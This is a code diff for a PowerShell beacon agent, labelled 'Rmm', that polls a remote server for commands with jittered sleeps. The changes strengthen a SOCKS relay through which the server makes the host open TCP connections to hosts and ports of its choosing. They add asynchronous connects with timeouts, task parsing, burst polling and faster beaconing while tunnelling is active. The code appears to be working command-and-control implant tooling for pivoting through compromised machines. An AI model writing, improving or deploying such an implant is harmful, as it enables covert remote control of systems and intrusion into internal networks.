@@ -574,6 +574,30 @@ function Parse-CmdResponse {
     return @{ command = $cmd; type = $typ; socks_active = $socks }
 }
 
+function Get-RmmCmdSocksActive {
+    param($CmdData)
+    if ($null -eq $CmdData) { return $false }
+    if ($CmdData -is [hashtable]) {
+        if ($CmdData.ContainsKey('socks_active')) { return [bool]$CmdData['socks_active'] }
+        return [bool]$CmdData.socks_active
+    }
+    foreach ($p in $CmdData.PSObject.Properties) {
+        if ($p.Name -match '^(?i)socks_active$') { return [bool]$p.Value }
+    }
+    return $false
+}
+
+function Get-RmmSocksTasksFromPoll {
+    param($Poll)
+    if ($null -eq $Poll) { return @() }
+    $obj = $Poll
+    if ($obj -is [string]) {
+        try { $obj = $obj | ConvertFrom-Json } catch { return @() }
+    }
+    if (-not $obj.tasks) { return @() }
+    return @($obj.tasks)
+}
+
 function Test-RmmInternalCommand {
     param([string]$Line)
     $c = $Line.Trim()
@@ -608,7 +632,7 @@ function Send-RmmTextResult {
 function Complete-RmmBeaconTurn {
     param([hashtable]$Headers)
     if ($script:RmmSocksEnabled) {
-        Invoke-RmmSocksCycle -Headers $Headers
+        Invoke-RmmSocksPollBurst -Headers $Headers
     }
 }
 
@@ -625,15 +649,18 @@ function Stop-RmmSocksRelay {
 
 function Invoke-RmmSocksCycle {
     param([hashtable]$Headers)
-    if (-not $script:RmmSocksEnabled) { return }
+    if (-not $script:RmmSocksEnabled) { return $false }
     $pollUrl = "$u/socks?id=$sessionId"
     $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
-    if ($null -eq $poll) { return }
-    $tasks = @()
-    if ($poll -is [string]) {
-        try { $poll = $poll | ConvertFrom-Json } catch { return }
+    if ($null -eq $poll) {
+        Write-RmmLog "SOCKS GET $pollUrl failed (check beacon token and server version)" -Level WARN
+        return $false
     }
-    if ($poll.tasks) { $tasks = @($poll.tasks) }
+    $tasks = Get-RmmSocksTasksFromPoll -Poll $poll
+    if ($tasks.Count -gt 0 -and -not $script:RmmSocksEnabled) {
+        $script:RmmSocksEnabled = $true
+        Write-Host "[+] SOCKS relay active (tasks from server)" -ForegroundColor Green
+    }
     $responses = New-Object System.Collections.ArrayList
     foreach ($task in $tasks) {
         $op = [string]$task.op
@@ -642,14 +669,29 @@ function Invoke-RmmSocksCycle {
         if ($op -eq 'connect') {
             $destHost = [string]$task.host
             $port = [int]$task.port
+            if ($script:RmmSocksConnections.ContainsKey($tid)) {
+                $existing = $script:RmmSocksConnections[$tid]
+                if ($existing -and $existing.Connected) {
+                    [void]$responses.Add(@{ id = $tid; op = 'ok' })
+                    continue
+                }
+            }
             try {
                 $tcp = New-Object System.Net.Sockets.TcpClient
                 $tcp.ReceiveTimeout = 5000
                 $tcp.SendTimeout = 5000
-                $tcp.Connect($destHost, $port)
+                $connectMs = 20000
+                $iar = $tcp.BeginConnect($destHost, $port, $null, $null)
+                if (-not $iar.AsyncWaitHandle.WaitOne($connectMs, $false)) {
+                    $tcp.Close()
+                    throw [System.TimeoutException]::new("Connect timed out after ${connectMs}ms")
+                }
+                $tcp.EndConnect($iar)
                 $script:RmmSocksConnections[$tid] = $tcp
+                Write-RmmLog "SOCKS outbound TCP $destHost`:$port (id $($tid.Substring(0,8)))" -Level INFO
                 [void]$responses.Add(@{ id = $tid; op = 'ok' })
             } catch {
+                Write-RmmLog "SOCKS connect $destHost`:$port failed: $($_.Exception.Message)" -Level WARN
                 [void]$responses.Add(@{ id = $tid; op = 'error'; msg = $_.Exception.Message })
             }
         }
@@ -705,7 +747,27 @@ function Invoke-RmmSocksCycle {
     if ($responses.Count -gt 0) {
         $body = @{ responses = @($responses) } | ConvertTo-Json -Compress -Depth 6
         $postUrl = "$u/socks?id=$sessionId"
-        Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
+        $posted = Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
+        if ($null -eq $posted) {
+            Write-RmmLog "SOCKS POST $postUrl failed ($($responses.Count) response(s) not acked)" -Level WARN
+            return $false
+        }
+    }
+    return $true
+}
+
+function Invoke-RmmSocksPollBurst {
+    param(
+        [hashtable]$Headers,
+        [int]$Rounds = 12,
+        [int]$DelayMs = 200
+    )
+    if (-not $script:RmmSocksEnabled) { return }
+    for ($i = 0; $i -lt $Rounds; $i++) {
+        $null = Invoke-RmmSocksCycle -Headers $Headers
+        if ($i -lt ($Rounds - 1)) {
+            Start-Sleep -Milliseconds $DelayMs
+        }
     }
 }
 
@@ -964,8 +1026,8 @@ while ($true) {
     try {
         # Add jitter before each poll cycle (shorter interval while SOCKS relay is active)
         if ($script:RmmSocksEnabled) {
-            $socksBase = [Math]::Min(2, $baseSleepSeconds)
-            $socksJitter = [Math]::Min(15, $jitterPercent)
+            $socksBase = 1
+            $socksJitter = 5
             $null = Get-JitteredSleep -baseSeconds $socksBase -jitterPercent $socksJitter
         } else {
             $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
@@ -973,6 +1035,10 @@ while ($true) {
 
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
+
+        if ($script:RmmSocksEnabled) {
+            Invoke-RmmSocksPollBurst -Headers $headers -Rounds 4 -DelayMs 100
+        }
         
         # Poll /cmd before register so a killed session gets __EXIT__ (register returns 403 TERMINATED).
         $cmdUrl = "$u/cmd?id=$sessionId"
@@ -985,13 +1051,13 @@ while ($true) {
         $cmdData = Parse-CmdResponse -response $response
         $command = ([string]$cmdData.command).Trim()
         $cmdType = [string]$cmdData.type
-        $socksActive = $false
-        if ($cmdData.socks_active -eq $true) { $socksActive = $true }
+        $socksActive = Get-RmmCmdSocksActive -CmdData $cmdData
 
         if ($socksActive) {
             if (-not $script:RmmSocksEnabled) {
                 $script:RmmSocksEnabled = $true
                 Write-Host "[+] SOCKS relay active (signaled by server)" -ForegroundColor Green
+                Invoke-RmmSocksPollBurst -Headers $headers -Rounds 8 -DelayMs 100
             }
         } elseif ($script:RmmSocksEnabled) {
             Stop-RmmSocksRelay
